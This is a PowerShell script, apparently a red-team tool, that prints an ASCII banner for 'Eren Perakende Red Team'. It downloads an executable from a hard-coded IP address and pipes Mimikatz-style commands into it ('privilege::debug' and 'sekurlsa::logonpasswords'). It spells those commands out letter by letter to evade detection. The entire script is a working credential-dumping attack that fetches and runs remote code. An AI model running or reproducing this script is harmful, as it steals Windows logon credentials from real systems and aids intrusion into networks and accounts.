Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
                                                                                                         
@@@@@@@@@@    @@@@@@    @@@@@@@   @@@@@@   @@@@@@@    @@@@@@   @@@  @@@       @@@@@@@    @@@@@@     @@@  
@@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@       @@@@@@@@  @@@@@@@    @@@@  
@@! @@! @@!  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!@!@@@       @@!  @@@  !@@       @@@!!  
!@! !@! !@!  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!!@!@!       !@!  @!@  !@!         !@!  
@!! !!@ @!@  @!@!@!@!  !@!       @!@!@!@!  @!@!!@!   @!@  !@!  @!@ !!@!       @!@@!@!   !!@@!!      @!@  
!@!   ! !@!  !!!@!!!!  !!!       !!!@!!!!  !!@!@!    !@!  !!!  !@!  !!!       !!@!!!     !!@!!!     !@!  
!!:     !!:  !!:  !!!  :!!       !!:  !!!  !!: :!!   !!:  !!!  !!:  !!!       !!:            !:!    !!:  
:!:     :!:  :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  :!:           !:!     :!:  
:::     ::   ::   :::   ::: :::  ::   :::  ::   :::  ::::: ::   ::   ::  :::   ::       :::: ::     :::  
 :      :     :   : :   :: :: :   :   : :   :   : :   : :  :   ::    :   :::   :        :: : :       ::  
                                                                                                         
" 
Write-Host -Fore Red "          Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

if (-not (Test-Path "C:\eren")) {
    New-Item -Path "C:\eren" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\macaron")) {
    New-Item -Path "C:\eren\macaron" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\macaron")) {
    New-Item -Path "C:\eren\macaron" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\macaron\tatli.exe")) {
    Invoke-WebRequest -Uri "http://78.129.240.79:8080/tatli.exe" -OutFile "C:\eren\macaron\tatli.exe"
}

$a = "p"; $b = "r"; $c = "i"; $d = "v"; $e = "i"; $f = "l"; $g = "g"
$cmd1 = "$a$b$c$d$e$f$g" + "::" + "debug"

$h = "s"; $i = "e"; $j = "k"; $k1 = "u"; $l1 = "r"; $m1 = "l"; $n1 = "s"; $o1 = "a"
$mod = "$h$i$j$k1$l1$m1$n1$o1" 

$p1 = "l"; $p2 = "o"; $p3 = "g"; $p4 = "o"; $p5 = "n"; $p6 = "p"; $p7 = "a"; $p8 = "s"; $p9 = "s"; $p10 = "w"; $p11 = "o"; $p12 = "r"; $p13 = "d"; $p14 = "s"
$cmd2 = "$mod" + "::" + "$p1$p2$p3$p4$p5$p6$p7$p8$p9$p10$p11$p12$p13$p14"

$cmd3 = "ex" + "it"

$commands = "$cmd1`n$cmd2`n$cmd3"

$commands | & "C:\eren\macaron\tatli.exe"